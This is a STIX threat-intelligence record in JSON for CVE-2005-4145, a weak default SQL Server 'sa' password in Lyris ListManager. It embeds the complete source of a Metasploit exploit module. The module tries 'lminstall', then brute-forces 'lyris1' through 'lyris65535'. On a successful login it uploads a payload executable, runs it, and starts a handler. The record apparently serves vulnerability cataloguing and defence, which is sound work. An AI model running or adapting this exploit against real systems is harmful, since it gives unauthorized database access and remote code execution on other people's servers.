{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1a74dd2a-20ff-4fe1-adf1-85942aa87ae9",
    "created": "2024-08-14T16:39:51.774046Z",
    "modified": "2024-08-14T16:39:51.774049Z",
    "name": "Lyris ListManager MSDE Weak sa Password",
    "description": " This module exploits a weak password vulnerability in the Lyris ListManager MSDE install. During installation, the 'sa' account password is set to 'lminstall'. Once the install completes, it is set to 'lyris' followed by the process ID of the installer. This module brute forces all possible process IDs that would be used by the installer. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/mssql/lyris_listmanager_weak_pass.rb",
            "external_id": "lyris_listmanager_weak_pass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-4145"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::MSSQL\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n\n    super(update_info(info,\n      'Name'           => 'Lyris ListManager MSDE Weak sa Password',\n      'Description'    => %q{\n          This module exploits a weak password vulnerability in the\n        Lyris ListManager MSDE install. During installation, the 'sa'\n        account password is set to 'lminstall'. Once the install\n        completes, it is set to 'lyris' followed by the process\n        ID of the installer. This module brute forces all possible\n        process IDs that would be used by the installer.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-4145'],\n          [ 'OSVDB', '21559'],\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2005-12-08'\n      ))\n  end\n\n  # Do not automatically run this module, it can lead to lockouts with SQL Server 2005\n  def autofilter\n    false\n  end\n\n  def exploit\n\n    # New installations use a randomly generated suffix like \"lyris629dAe536F\"\n    pass = nil\n\n    while(true)\n      print_status(\"Trying to authenticate with password 'lminstall'...\")\n      if(mssql_login('sa', 'lminstall'))\n        pass = 'lminstall'\n        break\n      end\n\n      print_status(\"Trying to authenticate with passwords 'lyris1' to 'lyris65535'...\")\n      1.upto(65535) do |pid|\n\n        if(pid % 1000 == 0)\n          print_status(\" >> Completed #{pid} of 65535 authentication requests\")\n        end\n\n        if(mssql_login('sa', \"lyris#{pid}\"))\n          pass = \"lyris#{pid}\"\n          break\n        end\n      end\n      print_status(\"This system does not appear to be exploitable\")\n      return\n    end\n\n    print_status(\"\")\n    print_good(\"Successfully authenticated to #{rhost}:#{rport} with user 'sa' and password '#{pass}'\")\n    print_status(\"\")\n\n    exe = generate_payload_exe\n    mssql_upload_exec(exe)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-12-08",
    "x_mitre_platforms": [
        "win'"
    ]
}